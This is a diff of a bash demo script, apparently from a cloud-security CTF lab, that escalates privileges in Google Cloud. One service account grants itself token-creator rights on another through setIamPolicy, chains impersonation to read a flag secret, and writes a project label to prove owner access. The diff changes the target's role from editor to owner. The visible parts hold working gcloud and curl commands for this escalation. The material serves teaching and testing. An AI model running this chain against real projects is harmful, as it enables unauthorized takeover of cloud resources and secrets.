@@ -5,14 +5,14 @@
 # Attack: starting_sa holds iam.serviceAccounts.setIamPolicy on target_sa
 # (via a minimal custom role at the SA resource level). It calls setIamPolicy
 # to grant itself roles/iam.serviceAccountTokenCreator on target_sa, then
-# mints a short-lived OAuth token for target_sa and inherits its roles/editor
+# mints a short-lived OAuth token for target_sa and inherits its roles/owner
 # project permissions.
 #
 # Credential model (no static SA keys):
 #   Terraform granted YOUR ADC identity serviceAccountTokenCreator on starting_sa.
 #   Demo commands pass --impersonate-service-account=starting_sa to run as it.
 #   The exploit grants starting_sa tokenCreator on target_sa via setIamPolicy,
-#   then chains impersonation to target_sa (which holds roles/editor).
+#   then chains impersonation to target_sa (which holds roles/owner).
 #
 # Modes:
 #   Default (gcloud): uses gcloud iam service-accounts add-iam-policy-binding
@@ -104,7 +104,7 @@ for var_name in STARTING_SA_EMAIL TARGET_SA_EMAIL FLAG_SECRET_ID PROJECT_ID; do
 done
 
 echo "Starting SA (setIamPolicy on target_sa): $STARTING_SA_EMAIL"
-echo "Target SA   (roles/editor):              $TARGET_SA_EMAIL"
+echo "Target SA   (roles/owner):               $TARGET_SA_EMAIL"
 echo "Deployer    (your ADC):                  $DEPLOYER_EMAIL"
 echo "Project:                                 $PROJECT_ID"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
@@ -274,7 +274,8 @@ echo -e "${GREEN}✓ Propagation wait complete — tokenCreator binding should n
 #
 # Now that starting_sa holds roles/iam.serviceAccountTokenCreator on target_sa,
 # the full impersonation chain (your ADC → starting_sa → target_sa) is possible.
-# target_sa holds roles/editor + secretAccessor on the flag secret.
+# target_sa holds roles/owner, which natively includes secretmanager.versions.access
+# (no separate secretAccessor grant is needed to read the flag).
 echo -e "${YELLOW}Step 4: [EXPLOIT] Chaining impersonation starting_sa → target_sa → flag${NC}"
 
 if $USE_GCLOUD; then
@@ -370,11 +371,11 @@ else
     echo -e "${GREEN}✓ Read Secret Manager secret as $TARGET_SA_EMAIL via raw generateAccessToken chain${NC}\n"
 fi
 
-# Step 5: [EXPLOIT] Confirm editor-level write access (write proof beyond reading the secret)
-echo -e "${YELLOW}Step 5: [EXPLOIT] Verifying full roles/editor access via target SA (write proof)${NC}"
+# Step 5: [EXPLOIT] Confirm owner-level write access (write proof beyond reading the secret)
+echo -e "${YELLOW}Step 5: [EXPLOIT] Verifying full roles/owner access via target SA (write proof)${NC}"
 
 if $USE_GCLOUD; then
-    # Same full delegation chain — target_sa holds roles/editor on the project.
+    # Same full delegation chain — target_sa holds roles/owner on the project.
     show_attack_cmd "$TARGET_SA_EMAIL" \
         "gcloud projects update $PROJECT_ID --update-labels=pl-privesc-verified=true --impersonate-service-account=$STARTING_SA_EMAIL,$TARGET_SA_EMAIL"
     if gcloud projects update "$PROJECT_ID" \
@@ -382,7 +383,7 @@ if $USE_GCLOUD; then
             --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" \
             --quiet 2>/dev/null; then
         echo -e "${GREEN}✓ Successfully wrote a project label as $TARGET_SA_EMAIL!${NC}"
-        echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
+        echo -e "${GREEN}✓ PROJECT OWNER ACCESS CONFIRMED (roles/owner)${NC}"
         gcloud projects update "$PROJECT_ID" \
             --remove-labels=pl-privesc-verified \
             --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" \
@@ -409,7 +410,7 @@ else
 
     if echo "$PATCH_RESPONSE" | jq -e '.name' >/dev/null 2>&1; then
         echo -e "${GREEN}✓ Successfully wrote a project label using the generateAccessToken-derived token!${NC}"
-        echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
+        echo -e "${GREEN}✓ PROJECT OWNER ACCESS CONFIRMED (roles/owner)${NC}"
         curl -s -X PATCH \
             -H "Authorization: Bearer $TARGET_SA_TOKEN" \
             -H "Content-Type: application/json" \
@@ -430,14 +431,14 @@ echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. starting_sa ($STARTING_SA_EMAIL) used setIamPolicy to grant itself"
 echo "   roles/iam.serviceAccountTokenCreator on $TARGET_SA_EMAIL"
 echo "2. starting_sa minted a short-lived token for $TARGET_SA_EMAIL"
-echo "   (roles/editor + secretAccessor) and read the CTF flag"
+echo "   (roles/owner) and read the CTF flag"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_SA_EMAIL"
 echo "    -> (iam.serviceAccounts.setIamPolicy on target_sa — THE VULNERABILITY)"
 echo "    -> self-granted roles/iam.serviceAccountTokenCreator on target_sa"
 echo "    -> $TARGET_SA_EMAIL"
-echo "    -> (roles/editor on project $PROJECT_ID)"
+echo "    -> (roles/owner on project $PROJECT_ID)"
 echo "    -> CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
